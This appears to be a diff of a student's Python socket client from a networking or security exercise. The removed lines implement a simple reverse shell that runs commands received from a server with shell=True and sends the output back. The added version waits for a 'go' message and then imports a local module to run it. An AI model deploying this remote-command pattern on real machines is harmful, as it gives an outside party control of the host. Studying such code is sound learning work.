@@ -105,43 +105,22 @@ print("connection was closed")
 # Client
 
 # Aaron Hoddy
-# 4/22/26
-# Proof that I understand client.py
-
-# Step 1: Import
+# 5/7/26
 
 import socket
-import os
-import subprocess
 
-# Step 2: Variables
-
-host = "192.168.0." # server ip
+host = "192.168.0.196" # server ip
 port = 9999 # server port
 socket = socket.socket()
-# print(socket)
-
-# Step 3: Connect
 
 socket.connect((host,port))
 print("Connected")
 
-# Step 4: Receive data
-
 while True:
     data = socket.recv(1024)
-    if len(data) > 0:
-        print(data)
-        input("This is data. Hit enter to continue:\n")
-        command = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        print(command)
-        input("This is command. Hit enter to continue:\n")
-        output_byte = command.stdout.read() + command.stderr.read()
-        print(output_byte)
-        input("This is output_byte. Hit enter to continue:\n")
-        output_str = str(output_byte, "utf-8")
-        socket.send(str.encode(output_str))
-        print(output_str)
-        print("Sent back.")
-    #if len(data) > 0:
-    #    subprocess.Popen((socket.recv(1024)).decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+    command = data.decode("utf-8")
+    if command == "go":
+        socket.send(str.encode("received"))
+        print("Running file.")
+        import first7   #This runs file
+        socket.close()
